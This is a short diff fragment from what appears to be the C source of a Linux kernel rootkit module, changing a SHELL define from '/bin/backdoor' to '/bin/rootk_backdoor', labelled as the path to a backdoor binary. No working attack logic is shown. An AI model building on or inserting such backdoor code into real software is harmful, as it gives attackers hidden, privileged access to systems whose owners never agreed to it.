@@ -8,7 +8,7 @@
 #include <asm/paravirt.h>
 #include <linux/dirent.h>
 
-#define SHELL "/bin/backdoor"             /* path to backdoor binary */
+#define SHELL "/bin/rootk_backdoor"       /* path to backdoor binary */
 
 MODULE_LICENSE("GPL");
 
